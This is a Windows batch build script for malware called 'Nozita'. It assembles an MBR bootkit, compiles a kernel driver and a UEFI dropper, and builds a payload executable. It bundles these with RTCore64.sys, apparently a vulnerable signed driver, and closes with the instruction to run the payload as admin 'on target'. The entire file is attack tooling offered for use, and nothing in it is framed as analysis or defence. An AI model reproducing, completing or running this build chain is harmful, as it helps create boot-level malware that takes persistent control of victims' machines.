@echo off
:: Nozita Build Script
:: Requirements: NASM, WDK, mingw-w64, MSVC (cl.exe)

echo [1/4] Assembling MBR bootkit...
nasm -f bin -o mbr.bin mbr.asm

echo [2/4] Compiling kernel driver (requires WDK)...
cl /kernel /FI ntddk.h drv.c /link /DRIVER /SUBSYSTEM:NATIVE ^
   /NODEFAULTLIB /ENTRY:DriverEntry ntoskrnl.lib hal.lib /OUT:nozita_drv.sys

echo [3/4] Compiling UEFI dropper (requires mingw-w64)...
x86_64-w64-mingw32-gcc -ffreestanding -nostdlib -shared ^
   -Wl,--subsystem,10 -e efi_main efi.c -o bootx64.efi

echo [4/4] Compiling main payload...
cl /W4 /O2 main.c /link /SUBSYSTEM:WINDOWS /ENTRY:WinMain ^
   advapi32.lib user32.lib wininet.lib crypt32.lib shell32.lib ntdll.lib ^
   /OUT:payload.exe

echo.
echo Bundle: mbr.bin + nozita_drv.sys + RTCore64.sys + bootx64.efi + payload.exe
echo Run payload.exe as admin on target.
pause
